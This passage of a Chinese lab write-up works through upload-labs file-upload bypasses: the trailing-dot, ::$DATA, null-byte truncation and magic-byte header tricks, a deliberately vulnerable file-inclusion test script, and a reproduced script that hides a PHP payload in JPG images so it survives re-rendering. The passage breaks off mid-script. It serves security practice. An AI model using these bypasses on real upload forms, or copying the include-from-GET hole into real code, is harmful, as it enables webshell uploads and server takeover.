class=\"line\">黑名单</span><br><span class=\"line\">上传后没有改名 √</span><br><span class=\"line\">可上传jreg、png、gif、jpg √</span><br><span class=\"line\">可上传php1 pHp1 √</span><br><span class=\"line\">空格绕过  ×</span><br><span class=\"line\"><span class=\"keyword\">.htaccess</span> ×</span><br><span class=\"line\"><span class=\"keyword\">.</span>绕过 √</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/007_1.png\" alt=\"007_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/007_2.png\" alt=\"007_2\"></p>\n<p>查看源码看看</p>\n<p><img src=\"/img/fileupload/upload-labs/007_3.png\" alt=\"007_3\"></p>\n<p>没有过滤<code>.</code>的话应该可以利用windows和php叠加特性创建php空文件。</p>\n<h3 id=\"windows和php叠加特性绕过\"><a href=\"#windows和php叠加特性绕过\" class=\"headerlink\" title=\"windows和php叠加特性绕过\"></a>windows和php叠加特性绕过</h3><p><img src=\"/img/fileupload/upload-labs/007_4.png\" alt=\"007_4\"></p>\n<p>再利用<code>&lt;</code>进行重写。</p>\n<p><img src=\"/img/fileupload/upload-labs/007_5.png\" alt=\"007_5\"></p>\n<p>写入成功</p>\n<p><img src=\"/img/fileupload/upload-labs/007_6.png\" alt=\"007_6\"></p>\n<h2 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h2><h3 id=\"DATA绕过\"><a href=\"#DATA绕过\" class=\"headerlink\" title=\"::$DATA绕过\"></a>::$DATA绕过</h3><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">黑名单</span><br><span class=\"line\">上传后没有改名\t\t√</span><br><span class=\"line\">可上传jreg、png、gif、jpg\t\t√</span><br><span class=\"line\">可上传::<span class=\"variable\">$DATA</span>\t\t√</span><br><span class=\"line\">可上传php1,pHp1,php<span class=\"selector-class\">.xxx</span>,php. .\t\t√</span><br><span class=\"line\">空格绕过  ×</span><br><span class=\"line\"><span class=\"selector-class\">.htaccess</span> ×</span><br><span class=\"line\">.绕过 ×</span><br></pre></td></tr></table></figure>\n\n<p>::DATA仅支持Windows,在info.php中写入<?php phpinfo();?> 上传info.php::$DATA会在上传目录上生成一个info.php的文件</p>\n<p><img src=\"/img/fileupload/upload-labs/008_1.png\" alt=\"008_1\"></p>\n<p>底下插入了phpinfo函数。</p>\n<p><img src=\"/img/fileupload/upload-labs/008_2.png\" alt=\"008_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/008_3.png\" alt=\"008_3\"></p>\n<h3 id=\"相关特性\"><a href=\"#相关特性\" class=\"headerlink\" title=\"相关特性\"></a>相关特性</h3><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">假设上传个<span class=\"keyword\">info</span>.php文件,服务器为windows,<span class=\"keyword\">info</span>.php内容为&lt;?php phpinfo();?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">info</span>.php:a.jpg 生成<span class=\"keyword\">info</span>.php,内容为空</span><br><span class=\"line\"><span class=\"keyword\">info</span>.php::$DATA 生成<span class=\"keyword\">info</span>.php,内容为&lt;?php phpinfo();?&gt;</span><br><span class=\"line\"><span class=\"keyword\">info</span>.php::$INDEX_ALLOCATION  生成<span class=\"keyword\">info</span>.php文件夹</span><br><span class=\"line\"><span class=\"keyword\">info</span>.php::$DATA\\<span class=\"number\">0.</span>jpg    生成<span class=\"number\">0.</span>jpg,内容为&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>把Pass-07的检查::$DATA的注释掉测试一下</p>\n<p><img src=\"/img/fileupload/upload-labs/008_4.png\" alt=\"008_4\"></p>\n<p>以上的测试在本地通过。</p>\n<h2 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h2><h3 id=\"php-绕过\"><a href=\"#php-绕过\" class=\"headerlink\" title=\"php. .绕过\"></a>php. .绕过</h3><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传后没有改名\t\t√</span><br><span class=\"line\">可上传jreg、png、gif、jpg\t\t√</span><br><span class=\"line\">可上传::<span class=\"variable\">$DATA</span>\t\t×</span><br><span class=\"line\">可上传php1,pHp1,php<span class=\"selector-class\">.xxx</span>,php. .\t\t√</span><br><span class=\"line\">.绕过 ×</span><br><span class=\"line\"><span class=\"selector-class\">.htaccess</span> ×</span><br></pre></td></tr></table></figure>\n\n<p>根据没有改名和可以上传<code>php. .</code>猜测可能存在绕过。</p>\n<p><img src=\"/img/fileupload/upload-labs/009_1.png\" alt=\"009_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/009_2.png\" alt=\"009_2\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/009_3.png\" alt=\"009_3\"></p>\n<p>产生问题的原因是只删除了一次点号,当上传<code>info.php. .</code>时,先删除第一个点得到<code>info.php.</code>最后变成了点绕过。</p>\n<h2 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h2><h3 id=\"双写后缀名绕过\"><a href=\"#双写后缀名绕过\" class=\"headerlink\" title=\"双写后缀名绕过\"></a>双写后缀名绕过</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">发现php替换成了空</span><br><span class=\"line\">上传<span class=\"keyword\">default</span>.pphphp即可成功,应该是源代码中只替换了一次</span><br><span class=\"line\"></span><br><span class=\"line\">上传后没有改名\t\t√</span><br><span class=\"line\">可上传jreg、png、gif、jpg\t\t√</span><br><span class=\"line\">可上传::$DATA\t\t√</span><br><span class=\"line\">替换php为空</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/010_1.png\" alt=\"010_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/010_2.png\" alt=\"010_2\"></p>\n<p> 查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/010_3.png\" alt=\"010_3\"></p>\n<h2 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h2><h3 id=\"00截断绕过白名单\"><a href=\"#00截断绕过白名单\" class=\"headerlink\" title=\"%00截断绕过白名单\"></a>%00截断绕过白名单</h3><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">白名单</span><br><span class=\"line\">双写后缀\t\t×</span><br><span class=\"line\">特殊后缀名\t\t×</span><br><span class=\"line\">::<span class=\"variable\">$DATA</span>\t\t\t×</span><br><span class=\"line\">文件上传被改名     √</span><br><span class=\"line\">可上传png、gif、jpg\t\t√</span><br></pre></td></tr></table></figure>\n\n<p><strong>PHP版本低于5.3.29，且GPC关闭</strong>下是可以突破的</p>\n<p><img src=\"/img/fileupload/upload-labs/011_1.png\" alt=\"011_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/011_2.png\" alt=\"011_2\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/011_3.png\" alt=\"011_3\"></p>\n<p>问题的根源是上传的路径是用户可控的,当上传的路径为<code>save_path=../upload/yyg.php%00</code>后还会进行拼接,在接下来移动文件的时候经过<code>%00</code>截断后保留文件为<code>yyg.php</code>.</p>\n<p><img src=\"/img/fileupload/upload-labs/011_4.png\" alt=\"011_4\"></p>\n<p>用户能够控制上传路径是十分危险的。</p>\n<h2 id=\"0x12\"><a href=\"#0x12\" class=\"headerlink\" title=\"0x12\"></a>0x12</h2><h3 id=\"0x00截断绕过白名单\"><a href=\"#0x00截断绕过白名单\" class=\"headerlink\" title=\"0x00截断绕过白名单\"></a>0x00截断绕过白名单</h3><p>应该还是白名单,测试下先</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">双写后缀\t\t×</span><br><span class=\"line\">可上传png、gif、<span class=\"keyword\">jpg\t</span>\t√</span><br><span class=\"line\">文件上传被改名，后缀保留\t\t√ </span><br><span class=\"line\">特殊后缀名\t\t×</span><br></pre></td></tr></table></figure>\n\n<p><strong>PHP版本低于5.3.29，且GPC关闭</strong>下是可以突破的</p>\n<p>用burp抓包发现可以控制<code>save_path</code>,和get方式不同,POST方式利用0x00截断</p>\n<p><img src=\"/img/fileupload/upload-labs/012_1.png\" alt=\"012_1\"></p>\n<p>选中%00，用快捷键<code>ctrl+shift+u</code>后Go</p>\n<p><img src=\"/img/fileupload/upload-labs/012_2.png\" alt=\"012_2\"></p>\n<p>成了</p>\n<p><img src=\"/img/fileupload/upload-labs/012_3.png\" alt=\"012_3\"></p>\n<p>也可以用这种方式</p>\n<p><img src=\"/img/fileupload/upload-labs/012_4.png\" alt=\"012_4\"></p>\n<p><img src=\"/img/fileupload/upload-labs/012_5.png\" alt=\"012_5\"></p>\n<p><img src=\"/img/fileupload/upload-labs/012_6.png\" alt=\"012_6\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/012_7.png\" alt=\"012_7\"></p>\n<p>可以看到与Pass-11只是用了POST方式</p>\n<p>截断利用条件</p>\n<ol>\n<li>php版本小于<code>5.3.29</code> `。</li>\n<li>php的<code>magic_quotes_gpc</code>为OFF状态。</li>\n<li>拼接点在<code>url</code>处即<code>get</code>使用<code>%00</code></li>\n<li>拼接点在<code>post</code>处使用<code>0x00</code></li>\n</ol>\n<h2 id=\"0x13\"><a href=\"#0x13\" class=\"headerlink\" title=\"0x13\"></a>0x13</h2><h3 id=\"绕过二进制文件前两位ASCII检测\"><a href=\"#绕过二进制文件前两位ASCII检测\" class=\"headerlink\" title=\"绕过二进制文件前两位ASCII检测\"></a>绕过二进制文件前两位ASCII检测</h3><p><img src=\"/img/fileupload/upload-labs/013_1.png\" alt=\"013_1\"></p>\n<p>这一课需求变了,要求上传图片马,简单测试发现是白名单,会拼接图片后缀。上传图片马后还需要文件包含漏洞才行,但是作者提供的环境有没有文件包含。自己写一份本地验证。</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#includes.php 放在upload-labs根路径</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'file'</span>]) &#123;</span><br><span class=\"line\">\t\t$file = $_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">include</span> $file;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">include</span> <span class=\"string\">'index.php'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>burp抓包修改上传的gif文件,末尾插入phpinfo。png和jpg都能用这种方法。</p>\n<p><img src=\"/img/fileupload/upload-labs/013_2.png\" alt=\"013_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/013_3.png\" alt=\"013_3\"></p>\n<p>查看源码后发现考点在文件头幻数检测。</p>\n<p><img src=\"/img/fileupload/upload-labs/013_4.png\" alt=\"013_4\"></p>\n<p>JPG</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">16</span>进制</span><br><span class=\"line\">FF D8 FF E0 <span class=\"number\">00</span> <span class=\"number\">10</span> <span class=\"number\">4</span>A <span class=\"number\">46</span> <span class=\"number\">49</span> <span class=\"number\">46</span></span><br></pre></td></tr></table></figure>\n\n<p>GIF</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"number\">47</span> <span class=\"number\">49</span> <span class=\"number\">46</span> <span class=\"number\">38</span> <span class=\"number\">39</span> <span class=\"number\">61</span></span><br></pre></td></tr></table></figure>\n\n<p>(相当于文本的GIF89a,一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p>\n<p>PNG</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"number\">89</span> <span class=\"number\">50</span> <span class=\"number\">4</span>E <span class=\"number\">47</span></span><br></pre></td></tr></table></figure>\n\n<p>上传一个没有内容的空文件。</p>\n<p><img src=\"/img/fileupload/upload-labs/013_5.png\" alt=\"013_5\"></p>\n<p>GIF用自己添加的文件包含php验证</p>\n<p><img src=\"/img/fileupload/upload-labs/013_6.png\" alt=\"013_6\"></p>\n<p>PNG:</p>\n<p>可以用<code>ctrl+shift+u</code>快捷键将<code>%89</code>直接转hex</p>\n<p><img src=\"/img/fileupload/upload-labs/013_7.png\" alt=\"013_7\"></p>\n<p>JPG:</p>\n<p>可以用<code>ctrl+shift+u</code>快捷键将<code>%FF%D8%FF%E0%00%10%4A%46%49%46</code></p>\n<p><img src=\"/img/fileupload/upload-labs/013_8.png\" alt=\"013_8\"></p>\n<h2 id=\"0x14\"><a href=\"#0x14\" class=\"headerlink\" title=\"0x14\"></a>0x14</h2><h3 id=\"突破getimagesize\"><a href=\"#突破getimagesize\" class=\"headerlink\" title=\"突破getimagesize()\"></a>突破getimagesize()</h3><p>尝试了下用Pass-13的方法依然能上传图片马.png和jpg一样.</p>\n<p><img src=\"/img/fileupload/upload-labs/014_1.png\" alt=\"014_1\"></p>\n<p>查看源码</p>\n<p><img src=\"/img/fileupload/upload-labs/014_2.png\" alt=\"014_2\"></p>\n<p>这里是利用getimages函数来获取图片的宽高信息的,如果上传的不是图片,那就获取不到信息.</p>\n<p>依旧可以利用补充对应的图片文件头绕过.</p>\n<p>png:</p>\n<p>png有些特殊,光给文件头还不行,需指定文件大小。把下面这段</p>\n<p><code>%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52</code></p>\n<p>带入</p>\n<p><img src=\"/img/fileupload/upload-labs/014_3.png\" alt=\"014_3\"></p>\n<p>选中后用<code>ctrl+shift+u</code>快捷键。</p>\n<p><img src=\"/img/fileupload/upload-labs/014_4.png\" alt=\"014_4\"></p>\n<p><img src=\"/img/fileupload/upload-labs/014_5.png\" alt=\"014_5\"></p>\n<p>jpg:</p>\n<p>测试失败,即使是上传正常的jpg也被拒绝。</p>\n<h2 id=\"0x15\"><a href=\"#0x15\" class=\"headerlink\" title=\"0x15\"></a>0x15</h2><h3 id=\"突破exif-imagetype\"><a href=\"#突破exif-imagetype\" class=\"headerlink\" title=\"突破exif_imagetype()\"></a>突破exif_imagetype()</h3><p>gif:</p>\n<p><img src=\"/img/fileupload/upload-labs/015_1.png\" alt=\"015_1\"></p>\n<p>png:<code>%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52</code></p>\n<p><img src=\"/img/fileupload/upload-labs/015_2.png\" alt=\"015_2\"></p>\n<p>jpg:<code>%FF%D8%FF%E0%00%10%4A%46%49%46</code></p>\n<p><img src=\"/img/fileupload/upload-labs/015_3.png\" alt=\"015_3\"></p>\n<p>源码:</p>\n<p><img src=\"/img/fileupload/upload-labs/015_4.png\" alt=\"015_4\"></p>\n<h2 id=\"0x16\"><a href=\"#0x16\" class=\"headerlink\" title=\"0x16\"></a>0x16</h2><h3 id=\"二次渲染\"><a href=\"#二次渲染\" class=\"headerlink\" title=\"二次渲染\"></a>二次渲染</h3><p>二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了</p>\n<p>之前的招数不管用了,这次文件上传的图片经过了二次渲染。其中的代表<code>imagecreatefromjpeg</code>函数。</p>\n<p>通过查询MD5值可以看到.</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows下<span class=\"keyword\">cmd</span><span class=\"bash\">查看MD5:certutil -hashfile <span class=\"string\">\"filename\"</span> MD5</span></span><br><span class=\"line\">linux:md5sum <span class=\"string\">\"filename\"</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/016_1.png\" alt=\"016_1\"></p>\n<p>尝试了把phpinfo插入到文件的末尾,但是渲染的时候明显取不到这个位置。</p>\n<h3 id=\"jpg\"><a href=\"#jpg\" class=\"headerlink\" title=\"jpg:\"></a>jpg:</h3><p>可以通过毛子写的脚本生成一个二次渲染后依旧能保留payload的图片上传。</p>\n<p>利用方式,先上传jpg图片后,再把经过渲染的图片下到本地,通过</p>\n<p><code>php jpg_payload.php 1.jpg</code>命令生成payload图片。</p>\n<p><img src=\"/img/fileupload/upload-labs/016_2.png\" alt=\"016_2\"></p>\n<h4 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tThe algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class=\"line\"><span class=\"comment\">\tIt is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t1) Upload an arbitrary image via secured files upload script</span></span><br><span class=\"line\"><span class=\"comment\">\t2) Save the processed image and launch:</span></span><br><span class=\"line\"><span class=\"comment\">\tjpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tIn case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tSince the most straightforward injection method is used, the following problems can occur:</span></span><br><span class=\"line\"><span class=\"comment\">\t1) After the second processing the injected data may become partially corrupted.</span></span><br><span class=\"line\"><span class=\"comment\">\t2) The jpg_payload.php script outputs \"Something's wrong\".</span></span><br><span class=\"line\"><span class=\"comment\">\tIf this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tSergey Bobrov <span class=\"doctag\">@Black</span>2Fan.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tSee also:</span></span><br><span class=\"line\"><span class=\"comment\">\thttps://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t$miniPayload = <span class=\"string\">\"&lt;?php phpinfo();?&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!extension_loaded(<span class=\"string\">'gd'</span>) || !function_exists(<span class=\"string\">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">die</span>(<span class=\"string\">'php-gd is not installed'</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($argv[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tset_error_handler(<span class=\"string\">\"custom_error_handler\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>($pad = <span class=\"number\">0</span>; $pad &lt; <span class=\"number\">1024</span>; $pad++) &#123;</span><br><span class=\"line\">\t\t$nullbytePayloadSize = $pad;</span><br><span class=\"line\">\t\t$dis = <span class=\"keyword\">new</span> DataInputStream($argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t$outStream = file_get_contents($argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t$extraBytes = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t$correctImage = <span class=\"keyword\">TRUE</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($dis-&gt;readShort() != <span class=\"number\">0xFFD8</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Incorrect SOI marker'</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class=\"number\">0xFF</span>)) &#123;</span><br><span class=\"line\">\t\t\t$marker = $dis-&gt;readByte();</span><br><span class=\"line\">\t\t\t$size = $dis-&gt;readShort() - <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t\t$dis-&gt;skip($size);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>($marker === <span class=\"number\">0xDA</span>) &#123;</span><br><span class=\"line\">\t\t\t\t$startPos = $dis-&gt;seek();</span><br><span class=\"line\">\t\t\t\t$outStreamTmp = </span><br><span class=\"line\">\t\t\t\t\tsubstr($outStream, <span class=\"number\">0</span>, $startPos) . </span><br><span class=\"line\">\t\t\t\t\t$miniPayload . </span><br><span class=\"line\">\t\t\t\t\tstr_repeat(<span class=\"string\">\"\\0\"</span>,$nullbytePayloadSize) . </span><br><span class=\"line\">\t\t\t\t\tsubstr($outStream, $startPos);</span><br><span class=\"line\">\t\t\t\tcheckImage(<span class=\"string\">'_'</span>.$argv[<span class=\"number\">1</span>], $outStreamTmp, <span class=\"keyword\">TRUE</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($extraBytes !== <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span>($dis-&gt;readByte() === <span class=\"number\">0xFF</span>) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"keyword\">if</span>($dis-&gt;readByte !== <span class=\"number\">0x00</span>) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t$stopPos = $dis-&gt;seek() - <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t\t\t\t$imageStreamSize = $stopPos - $startPos;</span><br><span class=\"line\">\t\t\t\t\t$outStream = </span><br><span class=\"line\">\t\t\t\t\t\tsubstr($outStream, <span class=\"number\">0</span>, $startPos) . </span><br><span class=\"line\">\t\t\t\t\t\t$miniPayload . </span><br><span 